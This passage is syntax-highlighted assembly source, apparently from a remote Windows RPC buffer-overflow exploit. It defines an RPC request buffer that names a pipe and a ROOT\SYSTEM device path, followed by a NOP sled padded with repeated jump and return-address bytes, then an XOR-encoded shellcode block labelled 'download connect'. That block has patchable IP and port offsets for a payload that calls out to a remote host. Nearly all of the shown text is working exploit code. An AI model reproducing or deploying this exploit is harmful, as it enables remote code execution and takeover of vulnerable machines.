    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x60</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3C</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x26</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x5C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x49</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x05</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x3C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x24</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x36</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x52</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x5C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x59</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x48</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x44</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x88</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc0">
</span><span class="sc5">RPC_call_LEN</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RPC_call</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">RPC_call_end</span><span class="sc0">        \
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0xE0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
</span><span class="sc5">RPC_call_end_LEN</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RPC_call_end</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">SHELLCODE_IP</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">327</span><span class="sc0">
</span><span class="sc5">SHELLCODE_PORT</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">334</span><span class="sc0">
</span><span class="sc5">SHELLCODE_XORIP</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x154F1E2D</span><span class="sc0">
</span><span class="sc5">SHELLCODE_XORPORT</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x2d15</span><span class="sc0">



</span><span class="sc1">;download connect</span><span class="sc0">
</span><span class="sc5">shellcode</span><span class="sc0">       \
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x33</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x81</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x92</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x81</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x83</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEE</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xFC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x43</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7A</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x29</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x79</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF5</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x35</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x27</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x35</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xAC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x49</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x64</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x98</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x91</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x24</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x8F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xFE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xBD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFA</span><span class="sc4">,</span><span class="sc0">
